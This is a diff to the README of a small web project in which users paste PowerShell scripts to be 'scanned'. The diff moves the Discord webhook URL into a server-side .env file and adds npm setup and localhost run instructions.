@@ -56,18 +56,40 @@ roscan-website/
 
 ### Discord Webhook Setup
 
-The website is pre-configured with a Discord webhook. To use your own:
+The website now uses a secure backend proxy to hide webhook URLs. To configure your webhook:
 
-1. Open `js/main.js`
-2. Find the `webhookUrl` variable in the `submitPowerShell()` function
-3. Replace with your Discord webhook URL:
-   ```javascript
-   const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+1. Create a Discord webhook in your server
+2. Copy the `.env.example` file to `.env`
+3. Replace the webhook URL in `.env`:
    ```
+   DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
+   ```
+
+**Important:** Never commit the `.env` file to version control!
+
+## 🚀 Installation & Setup
+
+1. **Install dependencies:**
+   ```bash
+   npm install
+   ```
+
+2. **Configure environment:**
+   ```bash
+   cp .env.example .env
+   # Edit .env with your Discord webhook URL
+   ```
+
+3. **Start the server:**
+   ```bash
+   npm start
+   ```
+
+The application will run on `http://localhost:3000`
 
 ## 🎯 Usage
 
-1. **Visit the website** in your browser
+1. **Visit the website** at `http://localhost:3000`
 2. **Click the blue "Scan" button** in the main section
 3. **Paste your PowerShell script** in the modal popup
 4. **Click "Scanning PowerShell"** to submit
